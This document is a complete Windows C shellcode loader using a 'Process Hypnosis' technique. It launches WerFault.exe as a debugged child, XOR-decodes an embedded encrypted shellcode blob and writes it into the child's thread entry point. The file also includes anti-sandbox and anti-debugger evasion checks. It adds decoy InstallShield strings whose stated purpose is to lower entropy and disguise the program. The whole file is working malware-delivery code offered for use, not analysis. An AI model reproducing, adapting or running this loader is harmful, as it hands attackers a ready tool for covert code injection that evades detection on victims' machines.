#include <Windows.h>
#include <stdio.h>
//Process Hypnosis - Debugger assisted control flow hijack
// 1. Do some evasion yada yada
// 2. Create child process (WerFault.exe in this case) with DEBUG_ONLY_THIS_PROCESS flag set so parent will act like debugger
// 3. Once we hit debug event in child, we decode shellcode and write it to breakpoint
// 4. Restore the flow of application
// More info how this works: https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack

//CreateProcess target
#define TARGET_PROCESS_PATH		L"C:\\Windows\\System32\\WerFault.exe"
#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))

//XOR key
const unsigned char key[] = {0xFC, 0xDF, 0x3F, 0xAC, 0xDB, 0x12, 0x01, 0xFD, 0xDF, 0xB2, 0x2A, 0x9C, 0x7D, 0x21, 0x11, 0xCC};
//shellcode
unsigned char shellcode[] = { 0x00,0x97,0xBC,0x48,0x2B,0xFA,0xCD,0xFD,0xDF,0xB2,0x6B,0xCD,0x3C,0x71,0x43,0x9D,0xAA,0x97,0x0E,0x7E,0xBE,0x5A,0x8A,0xAF,0xBF,0xFA,0xA1,0xCE,0x65,0x69,0x9A,0x9E,0xDC,0x92,0x0E,0x65,0x93,0x1D,0xB6,0xB7,0x95,0xFA,0xA1,0xEE,0x2D,0x69,0x20,0x0C,0x50,0xE3,0x5E,0xD0,0xD9,0x3E,0x21,0xBC,0x1E,0x7B,0x27,0xDD,0x7C,0xE0,0xF3,0x21,0xAE,0x9E,0x6E,0xE4,0x50,0x40,0x21,0x76,0x9D,0x8E,0x62,0x9D,0xAD,0x47,0x90,0xB4,0xE4,0xD4,0x3D,0xA3,0x5E,0x60,0x01,0xFD,0xDF,0x39,0xAA,0x14,0x7D,0x21,0x11,0x84,0x79,0x1F,0x4B,0xCB,0x93,0x13,0xD1,0xB9,0x54,0xF2,0x0A,0x17,0x35,0x39,0x41,0x85,0xFD,0x0F,0xDC,0xFA,0x96,0x23,0xC8,0xB5,0x20,0x7B,0x6B,0x17,0x49,0xA9,0x59,0xCD,0x2A,0x97,0x0E,0x6C,0x9A,0xD3,0xC8,0xF0,0x73,0xF3,0x2B,0x5D,0x45,0xC1,0x64,0x3D,0xB0,0xDC,0x73,0x88,0xD3,0x57,0x38,0x2C,0xAA,0x6A,0x72,0xD8,0xF6,0x61,0x35,0x85,0xFD,0x0F,0x59,0xED,0x50,0x1E,0x49,0xB9,0x54,0xF2,0x36,0xD5,0x7C,0xF1,0x50,0x47,0xF8,0x57,0x7E,0xF4,0x9A,0x4A,0x49,0xFC,0x0F,0xEC,0x73,0xC6,0x3C,0x79,0x50,0x95,0xBD,0x85,0x77,0x2F,0x37,0x32,0x40,0xAF,0x20,0x52,0x72,0xDD,0x24,0x7B,0x59,0x47,0xEE,0x36,0x74,0x53,0x24,0xED,0x5C,0xB5,0xEE,0x69,0x79,0xD5,0xC3,0x56,0x78,0xA2,0x95,0xB1,0x5A,0xD8,0xDB,0x53,0x57,0xB5,0x56,0x53,0x63,0x5B,0xBF,0x6D,0x66,0xEA,0xFB,0x20,0xEA,0xFF,0x88,0x5A,0x88,0x1C,0x8C,0xE8,0x67,0xAD,0xBD,0x6C,0x20,0x05,0xAF,0x8C,0x76,0x16,0xE1,0x44,0x78,0x5A,0xDF,0xB2,0x2A,0x9C,0x82,0xF4,0xF9,0xC2,0xFC,0xDF,0x3F,0x9D,0xE2,0x20,0x2F,0xCC,0xE9,0x8A,0x04,0xAC,0x53,0x10,0x23,0xFE,0xFC,0x85,0x77,0x25,0x1A,0x5B,0xC6,0x3D,0x64,0xB3,0x2A,0x9C,0x30,0x10,0xD8,0x9F,0xAF,0xB5,0x3C,0xFF,0x92,0xA8,0x56,0x74,0x40,0x74,0x2A,0x9C,0x7D,0x21,0xEE,0x19,0x14,0x96,0x3F,0xAC,0xDB,0x3D,0x6F,0x8A,0x9C,0xFD,0x12,0xA9,0x12,0x49,0x44,0x85,0x9B,0xE9,0x6E,0xE8,0xAF,0x51,0x59,0xB6,0x8E,0xC4,0x13,0xDD,0x10,0x47,0x29,0x95,0xB3,0xA8,0x68,0xFA,0xEA,0x67,0x58,0xB5,0x8E,0xD3,0x6B,0xFB,0x1A,0x13,0x48,0x96,0xD1,0xEC,0x0D,0xF3,0xB6,0x74,0x50,0xA9,0xB9,0xE2,0x4F,0xF9,0x4A,0x12,0x29,0x89,0x8B,0x97,0x4A,0xE4,0x88,0x48,0x65,0xCB,0x87,0xC1,0x4E,0xDE,0x13,0x21,0x59,0x45,0x3D,0x8C,0x65,0xED,0x83,0x5F,0x30,0x34,0x8C,0xFA,0x92,0x9C,0x4F,0x89,0x95,0xCC,0xFC,0xDF,0x3F,0xFC,0x88,0x41,0x48,0x3A,0x1D,0x59,0x7F,0xB2,0x46,0xDE,0xC4,0x84,0x75,0x19,0x55,0xA6,0x84,0x5A,0x88,0x0C,0xB5,0xAD,0x70,0xCE,0x15,0xA1,0x22,0xCC,0xFC,0x96,0xB6,0x4C,0xB1,0x16,0x40,0xA4,0x96,0x08,0x5F,0xDA,0xE3,0xA7,0x11,0xCC,0xFC,0xDF,0xC0,0x79,0x96,0x23,0xC1,0xAE,0x85,0xFA,0xA3,0x6D,0x30,0x10,0xD8,0x81,0xCD,0x16,0x6C,0xFF,0x92,0xD5,0xC3,0xD0,0xD9,0xAA,0x51,0x63,0xA8,0xA4,0xD1,0xB9,0xE3,0x97,0xF8,0x6D,0x53,0x01,0x01,0xFD,0x96,0x08,0x6E,0x6C,0x48,0xC1,0x11,0xCC,0xFC,0xDF,0xC0,0x79,0x93,0xED,0xCE,0x89,0xDD,0x59,0x80,0x74,0x28,0x21,0x11,0xCC,0xAF,0x86,0x55,0xEC,0x81,0x5B,0x88,0x2C,0x1E,0x50,0x3A,0xD5,0xBA,0xE1,0x11,0xDC,0xFC,0xDF,0x76,0x16,0x83,0xB6,0x52,0x18,0xDF,0xB2,0x2A,0x9C,0x82,0xF4,0x59,0x5F,0xAF,0x8C,0x77,0x25,0x3C,0x5A,0x88,0x0C,0x97,0x3B,0xF0,0xD5,0xBA,0xE1,0x11,0xEC,0xFC,0xDF,0x76,0x25,0x22,0x5B,0xBB,0xEF,0x49,0x3B,0xC8,0x9C,0x7D,0x21,0x11,0x33,0x29,0x97,0xBC,0x68,0xFB,0x97,0xC1,0x89,0x6D,0xD4,0xA1,0x9B,0x35,0x20,0xD2,0x49,0x3C,0xAA,0xED,0xF4,0x18,0x4A,0x6B,0xFD,0x86,0x09,0xCA,0x81,0x57,0x2B,0x50,0x45,0x26,0x20,0xEA };

//lowering entropy by simulating InstallShield setup application strings
const unsigned char a1[] = "InstallShield Setup is preparing the InstallShield Wizard which will guide you through the program setup process. Please wait.";
const unsigned char a2[] = "Next";
const unsigned char a3[] = "Back";
const unsigned char a4[] = "Finish";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "Extracting %s";
const unsigned char a8[] = "WARNING: This program is protected by copyright law and international treaties.";
const unsigned char a9[] = "The InstallShield(R) Wizard will install %s on your computer. To continue, click Next.";
const unsigned char a0[] = "I accept the terms in the license agreement";
const unsigned char a11[] = "I do not accept the terms in the license agreement";
const unsigned char a12[] = "Back";
const unsigned char a13[] = "Change...";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";

//XOR function for shellcode decoding
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

int main() {
	//Evasion  - check for sleep forwarding
	DWORD startTime = GetTickCount();
	Sleep(2000); 
	double elapsedTime = (GetTickCount() - startTime) / 1000.0;
	if (elapsedTime < 1.5) {
		return -1;
	}

	//Evasion - check if debugger is present
	if (IsDebuggerPresent()) {
		return -2;
	}

	//Evasion - API emulation
	PVOID ev3 = FlsAlloc(0);
	if (ev3 == NULL) {
		return -3;
	}

	//Evasion - API emulation 
	PVOID ev4 = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
	if (ev4 == NULL) {
		return -4;
	}

	STARTUPINFOW			StartupInfo = { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo = { 0 };
	WCHAR				    szTargetProcess[MAX_PATH] = TARGET_PROCESS_PATH;
	DEBUG_EVENT			    DebugEvent = { 0 };
	SIZE_T				    sNumberOfBytesWritten = 0x00;

	if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		return -1;
	}

	// Parsing all debug events
	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {
		switch (DebugEvent.dwDebugEventCode) {
		// New thread creation
		case CREATE_THREAD_DEBUG_EVENT: {

			//XOR routine - decoding the shellcode
			XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));

			//Write the shellcode into the memory
			if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, shellcode, sizeof(shellcode), &sNumberOfBytesWritten) || sNumberOfBytesWritten != sizeof(shellcode)) {
				return -1;
			}

			// Detach child process
			if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
				return -1;
			}

			// Resume thread creation
			ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

			goto _END_OF_FUNC;
		};

		case EXIT_PROCESS_DEBUG_EVENT:
			return 0;

		default:
			break;
		}
		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}

_END_OF_FUNC:
	//Close the handles
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return 0;
}
